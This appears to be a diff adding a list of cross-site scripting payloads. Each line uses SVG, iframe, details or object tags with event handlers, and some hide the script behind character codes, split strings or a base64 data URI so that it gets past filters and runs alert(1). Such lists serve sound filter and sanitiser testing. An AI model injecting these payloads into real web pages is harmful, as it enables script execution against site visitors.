@@ -1,0 +1,12 @@
+<svg onload=eval(String.fromCharCode(0x61)+String.fromCharCode(0x6c)+String.fromCharCode(0x65)+String.fromCharCode(0x72)+String.fromCharCode(0x74)+'(1)')>
+<iframe srcdoc="<svg onload=setTimeout('al'+'ert(1)',0)>"></iframe>
+<details open ontoggle=window['al'+'ert'](1)></details>
+<svg><animate onbegin=window['al'+'ert'](1) /></svg>
+<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'></object>
+<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></details>
+<svg onload=window[`al`+`ert`](1)></svg>
+<iframe srcdoc="<img src=x onerror=window[`al`+`ert`](1)>"></iframe>
+<details open ontoggle=window[`al`+`ert`](1)></details>
+<svg onload=setTimeout(`al`+`ert(1)`,0)></svg>
+<iframe srcdoc="<svg onload=setTimeout(`al`+`ert(1)`,0)>"></svg>
+<details open ontoggle=setTimeout(`al`+`ert(1)`,0)></details>
